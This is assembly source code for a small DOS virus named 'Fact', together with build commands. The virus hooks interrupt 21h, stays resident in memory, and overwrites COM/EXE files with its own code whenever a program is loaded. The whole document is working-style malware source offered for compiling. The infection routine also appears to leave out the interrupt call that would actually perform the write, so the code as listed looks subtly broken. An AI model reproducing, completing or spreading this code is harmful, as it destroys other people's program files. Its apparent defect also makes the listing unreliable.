Fact is a 45 bytes overwriting resident COM/EXE infector. Infects files at
load and/or execute program by overwriting the infected file.
Compile Fact with Turbo Assembler v 4.0 by typing:
TASM /M FACT.ASM
TLINK /t /x FACT.OBJ

.model tiny 
.code 
 org   100h 
code_begin: 
         mov     ax,3521h         ; Get interrupt vector 21h 
         int     21h 
         mov     word ptr [int21_addr],bx 
         mov     word ptr [Int21_addr+02h],es 
         mov     ah,25h         ; Set interrupt vector 21h 
         lea     dx,int21_virus     ; DX = offset of int21_virus 
         int     21h 
         xchg    ax,dx         ; DX = number of bytes to keep res... 
         int     27h         ; Terminate and stay resident! 
int21_virus  proc    near         ; Interrupt 21h of Fact 
         cmp     ah,4bh         ; Load and/or execute program? 
         jne     int21_exit      ; Not equal? Jump to int21_exit 
         mov     ax,3d01h         ; Open file (write) 
         int     21h 
         xchg    ax,bx         ; BX = file handle 
         push    cs          ; Save CS at stack 
         pop     ds          ; Load DS from stack (CS) 
         mov     ah,40h         ; Write to file 
         mov     cx,(code_end-code_begin) 
         lea     dx,code_begin     ; DX = offset of code_begin 
int21_exit: 
         db      0eah         ; JMP imm32 (opcode 0eah) 
code_end: 
int21_addr   dd      ?             ; Address of interrupt 21h 
virus_name   db      '[Fact]'            ; Name of the virus 
         endp 
end         code_begin 